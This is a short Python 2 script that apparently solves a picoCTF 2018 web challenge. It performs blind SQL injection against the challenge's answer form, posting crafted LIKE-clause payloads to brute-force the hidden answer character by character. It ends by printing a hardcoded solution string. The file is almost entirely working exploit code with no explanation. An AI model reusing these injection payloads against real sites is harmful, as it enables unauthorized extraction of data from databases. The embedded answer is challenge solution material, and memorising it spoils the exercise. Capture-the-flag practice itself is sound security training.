import requests
import string
import json

alphabet = ['1', '4', 'a', 'd', 'h', 'i', 'n', 's', 't', 'x', 'A', 'D', 'H', 'I', 'N', 'S', 'T', 'X']

url = "http://2018shell1.picoctf.com:2644/answer2.php"

if not alphabet:
    for c in string.printable:
        answer = "' or answer like '%{}%".format(c)
        print "Testing answer:", answer
        data = {'answer':answer, 'debug':0}
        r = requests.post(url, data=data)
        if "wrong" not in r.text.lower():
            alphabet.append(c)


canary = ""
reset = False

while True:
    for c in alphabet:
        answer = "' or answer like '%{}' COLLATE utf8_bin or '1'='".format(c + canary)
        print "Testing answer:", answer
        data = {'answer':answer, 'debug':0}
        r = requests.post(url, data=data)
        print r.text
        if "wrong" not in r.text.lower():
            canary = c + canary
            reset = True

    if not reset:
        break

    reset = False

print canary

print "41AndSixSixths"
